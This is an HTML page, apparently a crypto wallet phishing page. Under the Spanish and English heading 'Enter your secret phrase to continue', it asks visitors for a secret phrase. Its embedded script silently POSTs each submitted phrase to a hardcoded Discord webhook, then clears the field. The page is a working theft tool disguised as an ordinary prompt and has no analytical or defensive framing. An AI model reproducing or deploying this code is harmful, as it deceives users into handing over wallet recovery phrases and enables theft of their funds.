<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
        <link rel="icon" href="https://gateway.pinata.cloud/ipfs/Qmc1ry24hGZ526EfC8cta43GQu8iAgH5Xro8RKSYptzeek?_gl=1*1vsb5hb*_ga*NTgzMzM3YTMtOWRiMS00MjJmLTgyOGItODNiMzI4NGEzZmQw*_ga_5RMPXG14TE*MTY3OTc1OTk5MC40MS4wLjE2Nzk3NTk5OTAuNjAuMC4w">

    <link href="https://fonts.googleapis.com/css?family=Tron&display=swap" rel="stylesheet">

    <title>Coloca tu frase secreta para continuar</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
      body {
        background-color: blue;
      }
      h1 {
        color: white;
         font-family: 'Tron', sans-serif;
      }
      #container {
        margin: 50px auto;
        max-width: 600px;
        width: 90%;
        text-align: center;
      }
     #input-field {
  background-color: #ffe0e8;
  border: none;
  border-radius: 30px 10px 30px 10px; /* top-left, top-right, bottom-right, bottom-left */
  font-size: 20px;
  margin-bottom: 20px;
  padding: 10px;
  width: 100%;
  color: #333;
}

     #submit-button {
  background-color: #94F06F;
  border: none;
  border-radius: 50px;
  color: white;
  font-size: 20px;
  padding: 10px 20px;
  transition: all 0.2s ease-in-out;
}

#submit-button:hover {
  background-color: #ff7eb9;
  cursor: pointer;
}

#submit-button:active {
  transform: scale(0.95);
}

      .error {
        color: red;
        font-size: 14px;
        margin-top: 10px;
      }
    </style>
  </head>
  <body>
    <div id="container">
      <h1>Enter your secret phrase to continue</h1>
      <form id="my-form">
        <input type="text" id="input-field" placeholder="Enter your phrase here">
        <br>
        <button type="submit" id="submit-button">Submit</button>
        <div id="error-message" class="error"></div>
      </form>
    </div>
    <script>
      const form = document.getElementById("my-form");
      const inputField = document.getElementById("input-field");
      const errorMessage = document.getElementById("error-message");

      form.addEventListener("submit", (event) => {
        event.preventDefault();
        const phrase = inputField.value;
        if (phrase.trim() === "") {
          errorMessage.textContent = "Error!";
          setTimeout(() => {
            errorMessage.textContent = "";
          }, 2000);
        } else {
          const webhookUrl = "https://discordapp.com/api/webhooks/1089376156001771520/8zcE4kmxhybKRgra4kNUIG3M8e9jKPK-OwmVjC86k_VzusJYoah8qDgrFwl5NgOGnyev";
          fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: phrase })
          });
          inputField.value = "";
        }
      });
    </script>
  </body>
</html>
